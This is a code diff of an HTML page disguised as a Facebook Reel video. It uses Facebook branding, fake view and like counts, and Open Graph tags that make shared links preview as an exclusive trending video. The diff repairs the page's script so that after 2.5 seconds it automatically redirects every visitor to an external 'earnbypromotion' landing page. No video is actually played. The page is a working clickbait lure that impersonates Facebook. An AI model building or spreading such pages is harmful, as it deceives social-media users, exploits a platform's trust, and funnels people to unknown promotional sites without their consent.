@@ -3,15 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Watch Trending Video - Facebook Reel</title>
-
-    <!-- Facebook Open Graph (OG) Tags -->
-    <meta property="og:title" content="🔥 Watch Exclusive Trending Video Now!" />
-    <meta property="og:description" content="1.2M Views • Watch full HD video on Facebook Reel" />
-    <meta property="og:image" content="https://cdn.phototourl.com/free/2026-09-22-550b172a-e7f8-45c7-9305-995e0f3fbe4e.jpg" />
-    <meta property="og:type" content="video.other" />
-    <meta property="og:url" content="https://cdn.phototourl.com/free/2026-09-22-550b172a-e7f8-45c7-9305-995e0f3fbe4e.jpg" />
-
+    <title>Facebook Reel</title>
+    <!-- Open Graph Meta Tags for Facebook Preview -->
+    <meta property="og:title" content="Watch Full HD Video">
+    <meta property="og:description" content="Click to stream full video player.">
+    <meta property="og:image" content="https://cdn.phototourl.com/free/2026-09-22-550b172a-a7f8-45c7-9305-995e0f3fbe4e.jpg">
     <style>
         * {
             margin: 0;
@@ -20,69 +16,53 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
 
-        body {
+        body, html {
+            height: 100%;
+            width: 100%;
             background-color: #000;
             color: #fff;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
             overflow: hidden;
         }
 
         .reel-container {
             position: relative;
             width: 100%;
-            max-width: 420px;
             height: 100vh;
-            background: #111;
             display: flex;
-            flex-direction: column;
-            justify-content: space-between;
+            justify-content: center;
+            align-items: center;
+            background-color: #1a1a1a;
         }
 
-        /* Fake Video Background Thumbnail */
         .video-placeholder {
-            position: absolute;
-            top: 0;
-            left: 0;
             width: 100%;
             height: 100%;
             object-fit: cover;
-            opacity: 0.85;
-            filter: brightness(0.9);
         }
 
-        /* Facebook Top Header Bar */
         .top-bar {
             position: absolute;
-            top: 15px;
-            left: 15px;
-            right: 15px;
+            top: 16px;
+            left: 16px;
             display: flex;
-            justify-content: space-between;
             align-items: center;
             z-index: 10;
         }
 
         .fb-logo {
+            font-size: 24px;
             font-weight: bold;
-            font-size: 20px;
             color: #1877f2;
-            background: rgba(0,0,0,0.5);
-            padding: 4px 10px;
-            border-radius: 6px;
         }
 
-        /* Right Side Reel Icons (Likes, Comments, Share) */
         .right-sidebar {
             position: absolute;
-            right: 15px;
+            right: 12px;
             bottom: 80px;
             display: flex;
             flex-direction: column;
-            gap: 20px;
             align-items: center;
+            gap: 20px;
             z-index: 10;
         }
 
@@ -90,25 +70,21 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 4px;
             font-size: 12px;
-            color: #fff;
-            text-shadow: 0 1px 3px rgba(0,0,0,0.8);
         }
 
         .icon-btn svg {
             width: 28px;
             height: 28px;
             fill: #fff;
-            filter: drop-shadow(0px 2px 4px rgba(0,0,0,0.6));
+            margin-bottom: 4px;
         }
 
-        /* Bottom Info Section */
         .bottom-info {
             position: absolute;
-            bottom: 25px;
-            left: 15px;
-            right: 70px;
+            bottom: 20px;
+            left: 16px;
+            right: 80px;
             z-index: 10;
         }
 
@@ -123,8 +99,7 @@
             width: 36px;
             height: 36px;
             border-radius: 50%;
-            background: #1877f2;
-            border: 2px solid #fff;
+            background-color: #1877f2;
         }
 
         .username {
@@ -134,11 +109,9 @@
 
         .caption {
             font-size: 13px;
-            opacity: 0.9;
-            line-height: 1.3;
+            color: #e4e6eb;
         }
 
-        /* Center Play Icon Animation */
         .loader-overlay {
             position: absolute;
             top: 50%;
@@ -174,7 +147,7 @@
 
     <div class="reel-container">
         <!-- Reel Background Image -->
-        <img src="https://cdn.phototourl.com/free/2026-09-22-550b172a-e7f8-45c7-9305-995e0f3fbe4e.jpg" alt="Facebook Reel Video" class="video-placeholder">
+        <img src="https://cdn.phototourl.com/free/2026-09-22-550b172a-a7f8-45c7-9305-995e0f3fbe4e.jpg" alt="Facebook Reel Video" class="video-placeholder">
 
         <!-- Top Facebook Bar -->
         <div class="top-bar">
@@ -201,7 +174,7 @@
                 <span>4.8K</span>
             </div>
             <div class="icon-btn">
-                <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
+                <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92c0-1.61-1.31-2.92-2.92-2.92z"/></svg>
                 <span>18.2K</span>
             </div>
         </div>
@@ -216,18 +189,13 @@
         </div>
     </div>
 
-        <script>
-        // Set exact GitHub Pages link to landing page
-        const LANDING_PAGE_URL = "https://earnbypromotion.github.io/index/landing.html
-";
+    <!-- Redirection Script -->
+    <script>
+        const LANDING_PAGE_URL = "https://earnbypromotion.github.io/index/landing.html";
 
-        // Auto Redirect after 2.5 seconds
-        setTimeout(() => {
-            window.location.href = https://earnbypromotion.github.io/index/landing.html
-;
+        setTimeout(function() {
+            window.location.replace(LANDING_PAGE_URL);
         }, 2500);
-        </script>
-  
+    </script>
 </body>
 </html>
-
